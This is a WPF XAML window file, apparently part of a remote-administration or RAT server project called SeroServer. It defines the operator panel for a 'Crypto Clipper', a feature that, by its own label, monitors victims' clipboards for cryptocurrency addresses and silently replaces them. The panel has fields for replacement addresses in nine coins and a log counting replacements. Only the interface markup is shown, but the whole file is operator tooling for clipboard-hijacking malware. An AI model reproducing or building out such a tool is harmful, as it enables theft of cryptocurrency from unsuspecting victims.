<Window x:Class="SeroServer.UI.CryptoClipperWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Crypto Clipper"
        Width="680" Height="620" MinWidth="540" MinHeight="480"
        WindowStartupLocation="CenterOwner"
        ResizeMode="CanResize"
        WindowStyle="None"
        AllowsTransparency="True"
        Background="Transparent">

    <Window.Resources>
        <Style x:Key="AddrBox" TargetType="TextBox">
            <Setter Property="Background"              Value="#0A0B14"/>
            <Setter Property="Foreground"              Value="#DDE0F0"/>
            <Setter Property="BorderBrush"             Value="#2A3058"/>
            <Setter Property="BorderThickness"         Value="1"/>
            <Setter Property="Padding"                 Value="6,4"/>
            <Setter Property="FontFamily"              Value="Consolas"/>
            <Setter Property="FontSize"                Value="10"/>
            <Setter Property="Height"                  Value="26"/>
            <Setter Property="VerticalContentAlignment" Value="Center"/>
        </Style>
        <Style x:Key="CoinLabel" TargetType="TextBlock">
            <Setter Property="Foreground"  Value="#a6e3a1"/>
            <Setter Property="FontSize"    Value="10"/>
            <Setter Property="FontWeight"  Value="SemiBold"/>
            <Setter Property="FontFamily"  Value="Consolas"/>
            <Setter Property="Width"       Value="46"/>
            <Setter Property="VerticalAlignment" Value="Center"/>
        </Style>
    </Window.Resources>

    <Border x:Name="RootBorder" CornerRadius="8" BorderThickness="1" ClipToBounds="True">
        <Border.Background><SolidColorBrush Color="#0C0D18"/></Border.Background>
        <Border.BorderBrush>
            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                <GradientStop Color="#2A2E50" Offset="0"/>
                <GradientStop Color="#141628" Offset="1"/>
            </LinearGradientBrush>
        </Border.BorderBrush>
        <Border.Effect>
            <DropShadowEffect Color="#000" BlurRadius="36" ShadowDepth="0" Opacity="0.80"/>
        </Border.Effect>

        <DockPanel LastChildFill="True">

            <!-- Accent bar -->
            <Rectangle DockPanel.Dock="Top" Height="2" IsHitTestVisible="False">
                <Rectangle.Fill>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#a6e3a1" Offset="0"/>
                        <GradientStop Color="#f9e2af" Offset="0.5"/>
                        <GradientStop Color="#89b4fa" Offset="1"/>
                    </LinearGradientBrush>
                </Rectangle.Fill>
            </Rectangle>

            <!-- Title bar -->
            <Border DockPanel.Dock="Top" Height="40" Background="#111222"
                    MouseLeftButtonDown="Window_MouseLeftButtonDown">
                <Grid Margin="14,0">
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                <StackPanel Orientation="Vertical" VerticalAlignment="Center">
                            <TextBlock FontSize="11" FontWeight="SemiBold" FontFamily="Segoe UI">
                                <TextBlock.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="#7AAEFF" Offset="0"/>
                                        <GradientStop Color="#B090FF" Offset="1"/>
                                    </LinearGradientBrush>
                                </TextBlock.Foreground>
                                <Run Text="Crypto Clipper"/>
                            </TextBlock>
                            <TextBlock x:Name="TxtTitle" Text="" FontSize="10" FontFamily="Segoe UI Mono">
                                <TextBlock.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="#C0CCD8" Offset="0"/>
                                        <GradientStop Color="#6A8099" Offset="0.5"/>
                                        <GradientStop Color="#B0C0D0" Offset="1"/>
                                    </LinearGradientBrush>
                                </TextBlock.Foreground>
                            </TextBlock>
                        </StackPanel>
                        <Border x:Name="BadgeActive" Margin="10,0,0,0" CornerRadius="3"
                                Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
                                Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
                            <StackPanel Orientation="Horizontal">
                                <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                    <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
                                </Ellipse>
                                <TextBlock Text="ACTIVE" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI"/>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                        <Button Content="↻ Stats" Width="60" Height="26" Margin="0,0,4,0"
                                Style="{StaticResource SBtn}" FontSize="10" Click="BtnStats_Click"/>
                        <Button x:Name="BtnMax" Content="☐" Width="28" Height="26" Margin="0,0,4,0"
                                Style="{StaticResource SBtn}" FontSize="13" Padding="0" Click="BtnMax_Click"/>
                        <Button Content="✕" Width="28" Height="26" FontSize="10"
                                Style="{StaticResource SRedBtn}" Click="Close_Click" Padding="0"/>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- Status bar -->
            <Border DockPanel.Dock="Bottom" Height="28" Background="#111222"
                    BorderBrush="#1A1C2E" BorderThickness="0,1,0,0">
                                <Grid>
<TextBlock x:Name="TxtStatus" Text="Configure replacement addresses and enable"
                           Foreground="#404868" FontSize="11" FontFamily="Consolas"
                           VerticalAlignment="Center" Margin="14,0"/>
                    <Thumb Width="14" Height="14" HorizontalAlignment="Right" VerticalAlignment="Center"
                           Margin="0,0,4,0" Cursor="SizeNWSE" DragDelta="ResizeGrip_DragDelta">
                        <Thumb.Template>
                            <ControlTemplate TargetType="Thumb">
                                <Path Data="M2,12 L12,2 M5,12 L12,5 M9,12 L12,9"
                                      Stroke="#4A85F5" StrokeThickness="1.2" Opacity="0.6"/>
                            </ControlTemplate>
                        </Thumb.Template>
                    </Thumb>
                </Grid>
            </Border>

            <ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                <StackPanel Margin="14,12">

                    <!-- Enable toggle -->
                    <Border Background="#111222" CornerRadius="6" Padding="12,10" Margin="0,0,0,10"
                            BorderBrush="#1E2038" BorderThickness="1">
                        <Grid>
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                <CheckBox x:Name="ChkEnabled" Content="Enable Crypto Clipper"
                                          Foreground="#DDE0F0" FontSize="12" FontWeight="SemiBold"
                                          VerticalAlignment="Center" Checked="ChkEnabled_Changed" Unchecked="ChkEnabled_Changed"/>
                                <TextBlock Text="Monitors clipboard for crypto addresses and silently replaces them"
                                           Foreground="#505878" FontSize="10" FontFamily="Segoe UI"
                                           VerticalAlignment="Center" Margin="14,0,0,0"/>
                            </StackPanel>
                            <Button Content="Apply" Width="64" Height="26" HorizontalAlignment="Right"
                                    Style="{StaticResource SGreenBtn}" FontSize="10" Click="BtnApply_Click"/>
                        </Grid>
                    </Border>

                    <!-- Address config -->
                    <Border Background="#111222" CornerRadius="6" Padding="12,10" Margin="0,0,0,10"
                            BorderBrush="#1E2038" BorderThickness="1">
                        <StackPanel>
                            <TextBlock Text="REPLACEMENT ADDRESSES" Foreground="#404878" FontSize="9"
                                       FontWeight="SemiBold" FontFamily="Segoe UI" Margin="0,0,0,10"/>

                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="BTC" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrBTC" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Bitcoin — P2PKH (1...), P2SH (3...), Bech32 (bc1...)"/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="ETH/BNB" Style="{StaticResource CoinLabel}" Grid.Column="0" Width="54"/>
                                <TextBox x:Name="AddrETH" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Ethereum / BNB Smart Chain — 0x..."/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="LTC" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrLTC" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Litecoin — L..., M..., or 3..."/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="TRX" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrTRX" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="TRON — T..."/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="SOL" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrSOL" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Solana — base58, 32-44 chars"/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="XMR" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrXMR" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Monero — 4..., 95 chars"/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="XRP" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrXRP" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Ripple — r..."/>
                            </Grid>
                            <Grid Margin="0,0,0,6">
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="DASH" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrDASH" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Dash — X..."/>
                            </Grid>
                            <Grid>
                                <Grid.ColumnDefinitions><ColumnDefinition Width="50"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                <TextBlock Text="BCH" Style="{StaticResource CoinLabel}" Grid.Column="0"/>
                                <TextBox x:Name="AddrBCH" Grid.Column="1" Style="{StaticResource AddrBox}"
                                         ToolTip="Bitcoin Cash — bitcoincash:q... or p..."/>
                            </Grid>
                        </StackPanel>
                    </Border>

                    <!-- Detection log -->
                    <Border Background="#111222" CornerRadius="6" Padding="12,10" Margin="0,0,0,10"
                            BorderBrush="#1E2038" BorderThickness="1">
                        <StackPanel>
                            <Grid Margin="0,0,0,8">
                                <TextBlock Text="DETECTION LOG" Foreground="#404878" FontSize="9"
                                           FontWeight="SemiBold" FontFamily="Segoe UI"/>
                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
                                    <TextBlock x:Name="TxtCount" Text="0 replacements" Foreground="#a6e3a1"
                                               FontSize="10" FontFamily="Consolas" VerticalAlignment="Center" Margin="0,0,10,0"/>
                                    <Button Content="Clear log" Width="64" Height="22"
                                            Style="{StaticResource SBtn}" FontSize="9" Click="BtnClearLog_Click"/>
                                </StackPanel>
                            </Grid>
                            <Border Background="#07080F" CornerRadius="4" Height="120">
                                <ScrollViewer x:Name="LogScroll" VerticalScrollBarVisibility="Auto">
                                    <TextBox x:Name="TxtLog"
                                             Background="Transparent" Foreground="#C8D0E8"
                                             FontFamily="Consolas" FontSize="10"
                                             BorderThickness="0" Padding="8,6"
                                             IsReadOnly="True" TextWrapping="Wrap"
                                             AcceptsReturn="True"/>
                                </ScrollViewer>
                            </Border>
                        </StackPanel>
                    </Border>

                </StackPanel>
            </ScrollViewer>
        </DockPanel>
    </Border>
</Window>
